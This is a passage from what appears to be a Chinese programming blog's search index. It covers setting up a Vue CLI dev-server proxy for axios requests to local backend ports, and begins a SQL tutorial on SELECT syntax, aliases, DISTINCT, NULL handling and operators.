class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">School</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">Student</span>&gt;</span><span class="tag">&lt;/<span class="name">Student</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Student</span> <span class="keyword">from</span> <span class="string">&#x27;./components/Student.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">School</span> <span class="keyword">from</span> <span class="string">&#x27;./components/School.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">	<span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">School</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="title class_">Student</span></span></span><br><span class="line"><span class="language-javascript">	&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144912.png" alt="  "></p>
<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架总结（五、Vue配置代理）</title>
    <url>/posts/44d90ad5.html</url>
    <content><![CDATA[<h1 id="一、Vue脚手架配置代理"><a href="#一、Vue脚手架配置代理" class="headerlink" title="一、Vue脚手架配置代理"></a>一、Vue脚手架配置代理</h1><h2 id="1-案例引入"><a href="#1-案例引入" class="headerlink" title="1. 案例引入"></a>1. 案例引入</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145138.png" alt="  "></p>
<hr>
<p>在本机服务中，开放了<code>8085</code>与<code>8086</code>端口分别用于获取学生与汽车信息。</p>
<p>我们在 Vue 中使用 <code>axios</code> 请求数据</p>
<ul>
<li>首先安装 axios</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure>
<ul>
<li>引入 axios</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong><code>src/App.vue</code></strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getStudent&quot;</span>&gt;</span>获取学生信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getStudent</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">axios</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:8085/students&quot;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(resp.<span class="property">data</span>.<span class="property">code</span> !== <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          _this.<span class="property">$message</span>.<span class="title function_">error</span>(resp.<span class="property">data</span>.<span class="property">msg</span> || <span class="string">&quot;网络出了点小差错~~~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data = &quot;</span>, resp.<span class="property">data</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145141.png" alt="  "></p>
<hr>
<p>当直接请求时发生了跨域问题，在这里，主要是由于端口号不同。要解决的方法也有很多，在此处，我们可以使用Vue中的配置代理方式。</p>
<h2 id="2-配置代理-方式1"><a href="#2-配置代理-方式1" class="headerlink" title="2. 配置代理_方式1"></a>2. 配置代理_方式1</h2><p>打开 <code>vue.config.js</code> 文件，配置代理。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145143.png" alt="  "></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; defineConfig &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@vue/cli-service&#x27;</span>)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">	<span class="attr">transpileDependencies</span>: <span class="literal">true</span>,</span><br><span class="line">	<span class="attr">lintOnSave</span>: <span class="literal">false</span>, <span class="comment">// 关闭语法检查</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 开启代理服务器</span></span><br><span class="line">	<span class="attr">devServer</span>:&#123;</span><br><span class="line">		<span class="attr">proxy</span>: <span class="string">&quot;http://localhost:8085&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


<p>再将<code>src/App.vue</code>中的请求路径端口改为vue服务启动端口（<code>8080</code>）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getStudent</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">axios</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 请求端口改为 8080</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:8080/students&quot;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(resp.<span class="property">data</span>.<span class="property">code</span> !== <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          _this.<span class="property">$message</span>.<span class="title function_">error</span>(resp.<span class="property">data</span>.<span class="property">msg</span> || <span class="string">&quot;网络出了点小差错~~~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data = &quot;</span>, resp.<span class="property">data</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145148.png" alt="  "></p>
<hr>
<blockquote>
<p><strong>配置代理_方式1：</strong> </p>
<ul>
<li>优点：配置简单，请求资源时直接发给前端即可 </li>
<li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理 </li>
<li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 &#x3D;&#x3D;（优先匹配前端资源）&#x3D;&#x3D;</li>
</ul>
</blockquote>
<h2 id="3-配置代理-方式2"><a href="#3-配置代理-方式2" class="headerlink" title="3. 配置代理_方式2"></a>3. 配置代理_方式2</h2><p>同样是在<code>vue.config.js</code>中做配置</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      	<span class="string">&#x27;/api1&#x27;</span>: &#123; <span class="comment">// 匹配所有以 &#x27;/api1&#x27;开头的请求路径</span></span><br><span class="line">        	<span class="attr">target</span>: <span class="string">&#x27;http://localhost:8085&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">        	<span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        	<span class="comment">// 将 /api1 替换为 空字符串，否则发送至后端时的 url 仍带有 /api1</span></span><br><span class="line">        	<span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api1&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">      	&#125;,</span><br><span class="line">      	<span class="string">&#x27;/api2&#x27;</span>: &#123; <span class="comment">// 匹配所有以 &#x27;/api2&#x27;开头的请求路径</span></span><br><span class="line">        	<span class="attr">target</span>: <span class="string">&#x27;http://localhost:8086&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">        	<span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        	<span class="comment">// 将 /api2 替换为 空字符串，否则发送至后端时的 url 仍带有 /api2</span></span><br><span class="line">        	<span class="attr">pathRewrite</span>: &#123;<span class="string">&#x27;^/api2&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">      	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong><code>src/App.vue</code></strong></p>
<p>需要在&#x3D;&#x3D;请求路径端口号&#x3D;&#x3D;添加<code>vue.config.js</code>配置的路径名（例如<code>api1</code>）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">alt</span>=<span class="string">&quot;Vue logo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./assets/logo.png&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getStudent&quot;</span>&gt;</span>获取学生信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getCars&quot;</span>&gt;</span>获取汽车信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getStudent</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">axios</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:8080/api1/students&quot;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(resp.<span class="property">data</span>.<span class="property">code</span> !== <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          _this.<span class="property">$message</span>.<span class="title function_">error</span>(resp.<span class="property">data</span>.<span class="property">msg</span> || <span class="string">&quot;网络出了点小差错~~~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;students data = &quot;</span>, resp.<span class="property">data</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">getCars</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">axios</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:8080/api2/cars&quot;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(resp.<span class="property">data</span>.<span class="property">code</span> !== <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          _this.<span class="property">$message</span>.<span class="title function_">error</span>(resp.<span class="property">data</span>.<span class="property">msg</span> || <span class="string">&quot;网络出了点小差错~~~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;cars data = &quot;</span>, resp.<span class="property">data</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815145151.png" alt="  "></p>
<hr>
<blockquote>
<p><strong>配置代理_方式2：</strong></p>
<ul>
<li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理</li>
<li>缺点：配置略微繁琐，请求资源时必须加前缀</li>
</ul>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL之玩转SELECT</title>
    <url>/posts/10c232a9.html</url>
    <content><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>在我们平时使用SQL操作数据库中，查询语句使用的非常的频繁，所以很多人把查询语句单拎出来一类：DQL（数据查询语言）。</p>
<p>也确实SELECT是SQL语言的基础，最为重要。现在我们就把SELECT查询语法好好的捋一捋，相信看完本文你一定会玩转SELECT。</p>
<p>需要说明的是，下面很多SQL语句只需要注重语法就行，不必去纠结表名或字段名。</p>
<hr>
<h1 id="二、基本的SELECT语句"><a href="#二、基本的SELECT语句" class="headerlink" title="二、基本的SELECT语句"></a>二、基本的SELECT语句</h1><h2 id="1-SELECT-…"><a href="#1-SELECT-…" class="headerlink" title="1. SELECT …"></a>1. SELECT …</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 没有任何子句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">100</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">3</span> <span class="operator">+</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<h2 id="2-SELECT-…-FROM"><a href="#2-SELECT-…-FROM" class="headerlink" title="2. SELECT … FROM"></a>2. SELECT … FROM</h2><ul>
<li><strong>语法</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>选中全部列</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> student</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>选择特定列</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name</span><br><span class="line"><span class="keyword">FROM</span> student</span><br></pre></td></tr></table></figure>


<blockquote>
<ul>
<li>一般情况下，除非需要使用表中所有的字段数据，最好不要使用通配符<code>*</code>。使用通配符虽然可以节省输入查询语句的时间，但是获取不需要的列数据通常会降低查询和所使用的应用程序的效率。通配符的优势是，当不知道所需要的列的名称时，可以通过它获取它们。</li>
<li>在生产环境下，不推荐直接使用 <code>SELECT *</code> 进行查询。</li>
</ul>
</blockquote>
<h2 id="3-列的别名"><a href="#3-列的别名" class="headerlink" title="3. 列的别名"></a>3. 列的别名</h2><blockquote>
<p><strong>说明：</strong></p>
<ul>
<li>重命名一个列</li>
<li>便于计算</li>
<li>紧跟列名，也可以在列名和别名之间加入关键字<code>AS</code>，别名使用双引号，以便在别名中包含空格或特殊的字符并区分大小写。</li>
<li><code>AS</code> 可以省略</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">AS</span> stu_id, name stu_name</span><br><span class="line"><span class="keyword">FROM</span> student;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id <span class="keyword">AS</span> &quot;stu id&quot;, name &quot;stu name&quot;</span><br><span class="line"><span class="keyword">FROM</span> student;</span><br></pre></td></tr></table></figure>

<h2 id="4-去除重复行"><a href="#4-去除重复行" class="headerlink" title="4. 去除重复行"></a>4. 去除重复行</h2><p>默认情况下，查询会返回全部行，包括重复行。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 在<span class="keyword">SELECT</span>语句中使用关键字<span class="keyword">DISTINCT</span>去除重复行</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> department_id</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>

<p>针对以以下这种情况：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> department_id,salary</span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br></pre></td></tr></table></figure>

<p><strong>这里有两点需要注意：</strong></p>
<ol>
<li><code>DISTINCT</code> 需要放到所有列名的前面，如果写成 <code>SELECT salary, DISTINCT department_id FROM employees</code> 会报错。</li>
<li>DISTINCT 其实是对后面所有列名的组合进行去重，即对它后面的每个列的值都要进行比较，只有每个字段的值都相同了才叫重复。</li>
</ol>
<h2 id="5-空值参与计算"><a href="#5-空值参与计算" class="headerlink" title="5. 空值参与计算"></a>5. 空值参与计算</h2><ul>
<li>所有运算符或列值遇到<code>NULL</code>值，运算的结果都为<code>NULL</code></li>
</ul>
<blockquote>
<p>来个案例，在 employees 表中有员工id、月薪、奖金率三个字段（如下图），我们现在需要算出年薪<code>（12 * 月薪 * (1 + 奖金率)）</code>。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135841.png" alt=" "></p>
<hr>
<p>但当我们查询年薪时，就出问题了，以上奖金率为<code>NULL</code>的同志不就是没有奖金吗，现在直接工资都为<code>NULL</code>了，这搁谁乐意。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135851.png" alt=" "></p>
<hr>
<p>为了解决这个问题，我们可以使用<code>IFNULL()</code>函数<br><strong>IFNULL解析：</strong><br>用于判断第一个表达式是否为NULL，如果为NULL，则返回第二个参数，否则返回第一个参数的值。<br>因此，我们可以按如下查询<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135854.png" alt="  "></p>
</blockquote>
<h2 id="6-着重号的使用"><a href="#6-着重号的使用" class="headerlink" title="6. 着重号的使用"></a>6. 着重号的使用</h2><p>我们需要保证表中的字段、表名等没有和保留字、数据库系统或常用方法冲突。如果真的相同，那就使用一对 &#96;&#96;（着重号）引起来</p>
<blockquote>
<ul>
<li><p>错误<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135901.png" alt="  "></p>
</li>
<li><p>正确 <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135904.png" alt="  "></p>
</li>
</ul>
</blockquote>
<h2 id="7-查询常数"><a href="#7-查询常数" class="headerlink" title="7. 查询常数"></a>7. 查询常数</h2><p>SELECT 查询还可以对常数进行查询。对的，就是在 SELECT 查询结果中增加一列固定的常数列。这列的取值是我们指定的，而不是从数据表中动态取出的。</p>
<p>比如说，我们想对 employees 数据表中增加一列字段 my_name，这个<br>字段固定值为“TYT”，可以这样写：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;TYT&#x27;</span> <span class="keyword">as</span> my_name <span class="keyword">FROM</span> employees</span><br></pre></td></tr></table></figure>

<h2 id="8-数据过滤"><a href="#8-数据过滤" class="headerlink" title="8. 数据过滤"></a>8. 数据过滤</h2><ul>
<li><strong>语法</strong><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>,字段<span class="number">2</span></span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 过滤条件</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<ul>
<li>使用WHERE 子句，将不满足条件的行过滤掉</li>
<li>WHERE 子句紧随 FROM 子句</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employee_id, last_name, job_id, department_id</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> department_id <span class="operator">=</span> <span class="number">90</span> ;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="三、显示表结构"><a href="#三、显示表结构" class="headerlink" title="三、显示表结构"></a>三、显示表结构</h1><p>使用DESCRIBE 或 DESC 命令，表示表结构。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DESCRIBE</span> employees;</span><br><span class="line"># 或</span><br><span class="line"><span class="keyword">DESC</span> employees;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135908.png" alt="  "></p>
<blockquote>
<p><strong>其中，各个字段的含义分别解释如下：</strong></p>
<ul>
<li>Field：表示字段名称。</li>
<li>Type：表示字段类型，这里 barcode、goodsname 是文本型的，price 是整数类型的。</li>
<li>Null：表示该列是否可以存储NULL值。</li>
<li>Key：表示该列是否已编制索引。PRI表示该列是表主键的一部分；UNI表示该列是UNIQUE索引的一部分；MUL表示在列中某个给定值允许出现多次。</li>
<li>Default：表示该列是否有默认值，如果有，那么值是多少。</li>
<li>Extra：表示可以获取的与给定列有关的附加信息，例如AUTO_INCREMENT等。</li>
</ul>
</blockquote>
<hr>
<h1 id="四、运算符"><a href="#四、运算符" class="headerlink" title="四、运算符"></a>四、运算符</h1><h2 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1. 算术运算符"></a>1. 算术运算符</h2><p>算术运算符主要用于数学运算，其可以连接运算符前后的两个数值或表达式，对数值或表达式进行加（+）、减（-）、乘（*）、除（&#x2F;）和取模（%）运算。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135910.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 除法运算时，若分母为<span class="number">0</span>，则结果为 <span class="keyword">NULL</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span>, <span class="number">1</span> <span class="operator">+</span> <span class="number">1</span>, <span class="number">4</span> <span class="operator">-</span> <span class="number">1</span>, <span class="number">3</span> <span class="operator">+</span> <span class="number">2.5</span>, <span class="number">2</span> <span class="operator">*</span> <span class="number">3</span>, <span class="number">8</span> <span class="operator">/</span> <span class="number">3</span>, <span class="number">8</span> <span class="operator">%</span> <span class="number">3</span>, <span class="number">100</span> <span class="operator">/</span> <span class="number">0</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+-------+-------+---------+-------+--------+-------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">+</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">4</span> <span class="operator">-</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">3</span> <span class="operator">+</span> <span class="number">2.5</span> <span class="operator">|</span> <span class="number">2</span> <span class="operator">*</span> <span class="number">3</span> <span class="operator">|</span> <span class="number">8</span> <span class="operator">/</span> <span class="number">3</span>  <span class="operator">|</span> <span class="number">8</span> <span class="operator">%</span> <span class="number">3</span> <span class="operator">|</span> <span class="number">100</span> <span class="operator">/</span> <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span 